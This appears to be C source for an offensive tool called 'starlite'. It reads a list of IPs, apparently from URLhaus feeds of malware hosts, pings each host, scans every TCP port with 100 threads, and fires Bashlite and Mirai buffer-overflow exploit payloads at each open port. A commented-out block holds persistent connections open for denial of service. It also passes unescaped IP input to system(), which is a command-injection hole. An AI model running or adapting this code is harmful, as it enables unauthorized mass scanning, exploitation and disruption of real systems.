#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include "../exploits/bashlite-bufferoverflow.h"
#include "../exploits/mirai-bufferoverflow.h"
#include "../exploits/mirai-dos.h"

#define TMP_FILE "urlhaus.txt"
#define OUT_FILE "ips.txt"
#define MAX_LINE 1024
#define MAX_IPS 10000
#define MAX_PORT 65535
#define THREADS_PER_IP 100
#define TIMEOUT_SEC 1
#define CONNECTIONS_PER_OPEN_PORT 10

#define TCP_PING_PORTS_COUNT 6
#define TCP_PING_PORTS {22, 21, 23, 80, 443, 8080}

typedef struct {
    char ip[64];
    int start_port;
    int end_port;
} thread_args_t;

int try_connect(const char *ip, int port, int timeout_sec) {
    int sockfd;
    struct sockaddr_in addr;
    fd_set fdset;
    struct timeval tv;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return -1;

    fcntl(sockfd, F_SETFL, O_NONBLOCK);
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    connect(sockfd, (struct sockaddr*)&addr, sizeof(addr));

    FD_ZERO(&fdset);
    FD_SET(sockfd, &fdset);
    tv.tv_sec = timeout_sec;
    tv.tv_usec = 0;

    if (select(sockfd + 1, NULL, &fdset, NULL, &tv) > 0) {
        int so_error;
        socklen_t len = sizeof(so_error);
        getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &so_error, &len);
        if (so_error == 0) {
            fcntl(sockfd, F_SETFL, fcntl(sockfd, F_GETFL, 0) & ~O_NONBLOCK);
            return sockfd;
        }
    }

    close(sockfd);
    return -1;
}

void *scan_ports(void *arg) {
    thread_args_t *targs = (thread_args_t *)arg;
    for (int port = targs->start_port; port <= targs->end_port; port++) {
        int sockfd = try_connect(targs->ip, port, TIMEOUT_SEC);
        if (sockfd != -1) {
            send_bashlite_payload(targs->ip, port, sockfd);
            send_mirai_bufferoverflow(targs->ip, port);
            /*char ip_port[128];
            snprintf(ip_port, sizeof(ip_port), "%s:%d", targs->ip, port);

            pthread_t hold_threads[CONNECTIONS_PER_OPEN_PORT];
            for (int i = 0; i < CONNECTIONS_PER_OPEN_PORT; i++) {
                if (pthread_create(&hold_threads[i], NULL, hold_connection_thread, strdup(ip_port)) != 0) {
                    perror("Hold connection thread failed");
                }
            }

            for (int i = 0; i < CONNECTIONS_PER_OPEN_PORT; i++) {
                pthread_detach(hold_threads[i]);
            }

            printf("[starlite] [mirai] Started %d persistent connections to %s:%d\n", CONNECTIONS_PER_OPEN_PORT, targs->ip, port);*/
        }
    }
    return NULL;
}

void scan_ip_multithreaded(const char *ip) {
    pthread_t threads[THREADS_PER_IP];
    thread_args_t targs[THREADS_PER_IP];

    int ports_per_thread = (MAX_PORT + 1) / THREADS_PER_IP;

    for (int i = 0; i < THREADS_PER_IP; i++) {
        strncpy(targs[i].ip, ip, sizeof(targs[i].ip));
        targs[i].start_port = i * ports_per_thread;
        targs[i].end_port = (i == THREADS_PER_IP - 1) ? MAX_PORT : (i + 1) * ports_per_thread - 1;
        pthread_create(&threads[i], NULL, scan_ports, &targs[i]);
    }

    for (int i = 0; i < THREADS_PER_IP; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("[starlite] finished scanning %s\n", ip);
}

int ping_host_icmp(const char *ip) {
    char command[128];
    snprintf(command, sizeof(command), "ping -c 1 -W 1 %s > /dev/null 2>&1", ip);
    return system(command) == 0;
}

int ping_host_tcp(const char *ip, int ports[], int ports_count) {
    for (int i = 0; i < ports_count; i++) {
        if (try_connect(ip, ports[i], TIMEOUT_SEC) != -1) {
            return 1;
        }
    }
    return 0;
}

void deploy_scan_if_up(const char *ip) {
    int tcp_ping_ports[] = TCP_PING_PORTS;
    printf("[starlite] starting scan for %s\n", ip);
    if (ping_host_icmp(ip)) {
        printf("[starlite] ICMP echo reply from %s\n", ip);
        scan_ip_multithreaded(ip);
    } else {
        printf("[starlite] no ICMP echo reply, attempting TCP ping\n");
        if (ping_host_tcp(ip, tcp_ping_ports, TCP_PING_PORTS_COUNT)) {
            printf("[starlite] found an open TCP port for %s\n", ip);
            scan_ip_multithreaded(ip);
        } else {
            printf("[starlite] No open TCP ports found for %s\n", ip);
        }
    }
}

void scan_ips_from_file(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        perror("Failed to open IPs file");
        return;
    }

    char ip[64];
    while (fgets(ip, sizeof(ip), file)) {
        ip[strcspn(ip, "\n")] = 0;
        deploy_scan_if_up(ip);
    }

    fclose(file);
}